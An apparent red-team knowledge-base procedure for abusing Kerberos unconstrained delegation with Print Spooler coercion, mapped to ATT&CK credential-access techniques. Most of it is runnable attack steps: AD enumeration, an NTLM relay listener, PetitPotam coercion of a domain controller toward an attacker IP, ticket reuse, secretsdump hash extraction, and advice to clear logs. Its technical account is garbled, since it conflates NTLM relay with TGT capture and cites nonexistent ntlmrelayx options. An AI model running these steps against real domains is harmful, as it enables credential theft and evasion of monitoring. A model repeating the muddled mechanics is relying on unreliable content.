---
type: procedure
description: >-
  Abuse Kerberos unconstrained delegation on a domain-joined machine by coercing
  authentication to the Print Spooler service to capture TGTs and impersonate
  users for lateral movement and privilege escalation.
verified: true
submitted: false
created_at: '2023-04-06T03:56:07.430477+00:00'
updated_at: '2023-04-10T20:36:05.014235+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Find delegation]]'
  - '[[tags/Kerberos Unconstrained Delegation]]'
  - '[[tags/SpoolService Abuse with Unconstrained Delegation]]'
commands:
  - '[[commands/PowerShell-Check-TrustedForDelegation]]'
platforms:
  - Windows
tools: []
validated: true
---

# Kerberos-Unconstrained-Delegation-with-SpoolService-Abuse

## Summary

This procedure demonstrates how to identify and abuse Kerberos unconstrained delegation in an Active Directory environment, specifically targeting the Print Spooler (SpoolService) to coerce authentication from high-privilege accounts like domain controllers. By forcing a target machine to authenticate to an attacker-controlled system with unconstrained delegation enabled, the attacker can capture the user's Ticket Granting Ticket (TGT) via NTLM relay. This TGT can then be used to impersonate the user and request service tickets to any resource in the domain, enabling lateral movement, privilege escalation, and access to sensitive systems such as domain controllers or file servers.

## Description

Kerberos unconstrained delegation allows a service account or computer account to impersonate any user to any service in the domain without restrictions, configured via the 'TrustedForDelegation' attribute in Active Directory. This is often enabled on print servers or domain-joined machines for legitimate delegation needs but can be abused if an attacker gains control over such a machine. The SpoolService abuse involves using coercion techniques (e.g., via RPC calls to MS-RPRN) to force a target (like a domain controller) to authenticate to the attacker's controlled SpoolService. During this authentication, the attacker relays the NTLM credentials to capture the Kerberos TGT. With the TGT, the attacker can perform S4U2Self and S4U2Proxy extensions to forge service tickets for arbitrary resources. This technique is particularly powerful in domain environments for credential theft and is commonly used in red team engagements to simulate advanced persistent threats. It requires domain authentication and tools like Impacket for relaying, and it targets Windows Server environments with Active Directory.

## Requirements

1. Domain user credentials with network access to target machines and domain controllers.
2. Control over a domain-joined machine with unconstrained delegation enabled (TrustedForDelegation = True).
3. Active Directory PowerShell module installed (for enumeration).
4. Tools such as Impacket suite (ntlmrelayx, secretsdump) or Rubeus for ticket manipulation and coercion tools like PetitPotam or SpoolSample.
5. Network access to RPC ports (e.g., 445 for SMB, 135 for RPC) and the ability to host a relay server.

## Defense

- Disable unconstrained delegation where possible by setting TrustedForDelegation to False on non-essential accounts and monitor for changes using tools like Microsoft ATA or event logs (Event ID 4769 for ticket requests).
- Implement least privilege by using constrained delegation (with protocol restrictions) instead of unconstrained.
- Monitor for anomalous authentication patterns, such as unexpected connections to print spooler services from domain controllers (Event ID 4624 with Logon Type 3), and enable Protected Users group to prevent delegation for sensitive accounts.
- Use network segmentation to limit lateral movement and deploy endpoint detection for coercion tools (e.g., signatures for PetitPotam.exe).

## Objectives

1. Identify accounts or computers with unconstrained delegation enabled to find abuse opportunities.
2. Coerce authentication from high-value targets to the delegated service and capture TGTs.
3. Use captured TGTs to impersonate users, escalate privileges, and access restricted resources like domain controllers.
4. Achieve lateral movement and persistence in the Active Directory environment.

## Instructions

### Step 1: Enumerate Unconstrained Delegation Accounts

**Context**: Begin by querying Active Directory to identify user or computer accounts with the TrustedForDelegation attribute set to True. This reveals potential entry points for abuse. Focus on computers like print servers, as SpoolService is commonly exploited there. This step uses PowerShell with the Active Directory module to filter and list relevant objects.

**Command** ([[commands/PowerShell-Check-TrustedForDelegation]]):
```powershell
Get-ADObject -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select Name, ObjectClass, TrustedForDelegation
```

> This command queries AD for objects (users or computers) with unconstrained delegation enabled. Replace with specific filters if targeting users (`-SearchBase "OU=Users,DC=domain,DC=com"`) or computers. Expected output includes a list of names and confirmation of the attribute. Why: This identifies the compromised machine or account needed for the abuse; without it, the attack cannot proceed.

### Step 2: Set Up Relay Server on Delegated Machine

**Context**: On the attacker-controlled machine with unconstrained delegation (identified in Step 1), set up an NTLM relay server targeting the SpoolService (RPC endpoint MS-RPRN). This will capture incoming authentications as TGTs. Use Impacket's ntlmrelayx.py for the relay, configured to save tickets to a file for later use.

**Instructions**: Install Impacket if needed (`pip install impacket`). Run the relay server listening on SMB and RPC ports, specifying the SpoolService as the target protocol.

```bash
python3 ntlmrelayx.py -t spoolservice --spool-host localhost -smb2support -of /tmp/tickets.ccache
```

> Expected output: Relay server starts listening, logs incoming connections. Why: The relay intercepts NTLM auth and converts it to Kerberos TGTs due to the delegation permission; decision point—if no delegation, the relay will fail to impersonate.

### Step 3: Coerce Authentication from Target

**Context**: Force a high-privilege target (e.g., domain controller) to authenticate to your relay server by coercing an RPC connection to the SpoolService. Use a tool like PetitPotam to trigger the authentication without user interaction.

**Instructions**: From another controlled machine or the same, execute the coercion against the target DC, pointing to your relay server's IP.

```python
python3 petitpotam.py domain/user:password@target_dc_ip attacker_ip
```

> Expected output: No direct output, but check the relay logs for incoming NTLM auth and saved TGT in /tmp/tickets.ccache. Why: Coercion simulates a legitimate print job request, tricking the target into authenticating; verify success by checking if a .ccache file is created with the target's TGT.

### Step 4: Use Captured TGT for Impersonation

**Context**: Load the captured TGT into your session and use it to request service tickets for target resources (e.g., CIFS to a file server or LDAP to the DC). This allows impersonation as the coerced user.

**Instructions**: Use Rubeus or kinit to load the ticket, then access resources.

```bash
export KRB5CCNAME=/tmp/tickets.ccache
klist $KRB5CCNAME
# Then access, e.g., smbclient //targetserver/share -k
```

> Expected output: Ticket details shown with the impersonated user's principal; successful resource access without additional creds. Why: The TGT enables forging tickets to any service; if the user has admin rights, this leads to escalation—test with a low-priv resource first.

### Step 5: Cleanup and Exfiltration

**Context**: Dump additional credentials if possible (e.g., using secretsdump with the impersonated session) and clear logs to maintain access.

**Instructions**: Relay to secretsdump for hash extraction if targeting a DC.

```bash
python3 secretsdump.py -k -no-pass domain/target@target_dc
```

> Expected output: Hashes and tickets dumped to files. Why: Maximizes the abuse by extracting more creds; always verify no alerts via event logs.
